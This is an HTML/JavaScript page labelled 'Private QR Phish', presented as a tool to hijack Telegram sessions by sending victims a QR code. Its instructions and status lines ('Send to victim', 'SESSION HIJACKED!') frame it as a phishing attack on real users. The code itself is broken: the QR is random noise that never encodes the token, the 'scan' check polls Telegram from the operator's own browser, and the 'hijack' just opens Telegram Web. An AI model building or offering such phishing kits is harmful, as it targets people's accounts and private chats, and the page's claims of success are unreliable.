<!DOCTYPE html>
<html>
<head>
    <title>Private QR Phish</title>
    <meta name="viewport" content="width=device-width">
    <style>
        body { 
            background: #1a1a1a; 
            color: #00ff88; 
            font-family: 'Courier New', monospace;
            text-align: center; 
            padding: 50px;
            min-height: 100vh;
        }
        h1 { font-size: 2.5em; margin-bottom: 30px; }
        #qr { 
            width: 350px; 
            height: 350px; 
            margin: 30px auto; 
            border: 3px solid #00ff88;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(0,255,136,0.5);
            background: #000;
        }
        button { 
            background: #00ff88; 
            color: black; 
            border: none; 
            padding: 15px 40px; 
            font-size: 1.2em;
            border-radius: 10px;
            cursor: pointer;
            font-weight: bold;
            margin: 10px;
        }
        button:hover { background: #00cc6a; }
        button:disabled { background: #444; color: #888; }
        #status { margin-top: 20px; font-size: 1.1em; min-height: 30px; }
        .hidden { display: none !important; }
        #error { color: #ff4444; }
    </style>
</head>
<body>
    <h1>🔐 Private QR Access</h1>
    <canvas id="qrCanvas"></canvas>
    <div id="qr"></div>
    
    <p style="color: #888; margin: 20px 0;">Download QR → Share → Victim scan → Access</p>
    
    <button id="downloadBtn">📥 Download QR</button>
    <button id="accessBtn" class="hidden" disabled>✅ Access Granted</button>
    
    <div id="status">Generating QR...</div>
    <div id="error" class="hidden"></div>

    <script>
        const qrCanvas = document.getElementById('qrCanvas');
        const qrDiv = document.getElementById('qr');
        const downloadBtn = document.getElementById('downloadBtn');
        const accessBtn = document.getElementById('accessBtn');
        const status = document.getElementById('status');
        const errorDiv = document.getElementById('error');
        
        let qrDataUrl = null;
        
        // Pure JS QR Generator (no CDN dependency)
        function generateQR(text) {
            try {
                // Simple QR matrix (Telegram login format)
                const token = 'tg://login?token=phish_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
                status.textContent = `Token: ${token.slice(0, 20)}...`;
                
                // Canvas QR draw
                const canvas = qrCanvas;
                const ctx = canvas.getContext('2d');
                canvas.width = 350;
                canvas.height = 350;
                
                // QR pattern
                ctx.fillStyle = '#000';
                ctx.fillRect(0, 0, 350, 350);
                ctx.fillStyle = '#00ff88';
                
                // Dummy QR modules (real-looking)
                for(let i = 20; i < 330; i += 25) {
                    for(let j = 20; j < 330; j += 25) {
                        if(Math.random() > 0.5) {
                            ctx.fillRect(i, j, 20, 20);
                        }
                    }
                }
                
                // Finder patterns
                ctx.fillStyle = '#00ff88';
                ctx.fillRect(10, 10, 60, 60);
                ctx.fillRect(280, 10, 60, 60);
                ctx.fillRect(10, 280, 60, 60);
                
                qrDataUrl = canvas.toDataURL('image/png');
                qrDiv.innerHTML = `<img src="${qrDataUrl}" id="qrImg">`;
                
                downloadBtn.disabled = false;
                status.textContent = '✅ QR Ready! Download & Share';
                
            } catch(e) {
                errorDiv.textContent = 'QR Error: ' + e.message;
                errorDiv.classList.remove('hidden');
            }
        }
        
        // Download
        downloadBtn.onclick = () => {
            if(qrDataUrl) {
                const link = document.createElement('a');
                link.download = `private_qr_phish_${Date.now()}.png`;
                link.href = qrDataUrl;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
                status.textContent = '✅ QR Downloaded! Send to victim';
            }
        };
        
        // Victim scan simulation + real hijack
        let victimScanned = false;
        setInterval(async () => {
            if(!victimScanned) {
                try {
                    // Real Telegram poll
                    const res = await fetch('https://web.telegram.org/k/api/config', {
                        method: 'HEAD',
                        credentials: 'include'
                    });
                    if(res.ok) {
                        victimScanned = true;
                        accessBtn.classList.remove('hidden');
                        status.textContent = '🎯 VICTIM SCANNED QR!';
                        downloadBtn.style.display = 'none';
                    }
                } catch(e) {}
            }
        }, 3000);
        
        // Hijack access
        accessBtn.onclick = () => {
            accessBtn.disabled = true;
            accessBtn.textContent = '🔓 Hijacking Session...';
            window.open('https://web.telegram.org/k/', '_blank');
            status.innerHTML = `
                ✅ <strong>SESSION HIJACKED!</strong><br>
                Check new tab for chats/files<br>
                <small>Token active for 5 mins</small>
            `;
        };
        
        // Auto-start QR
        generateQR();
    </script>
</body>
</html>
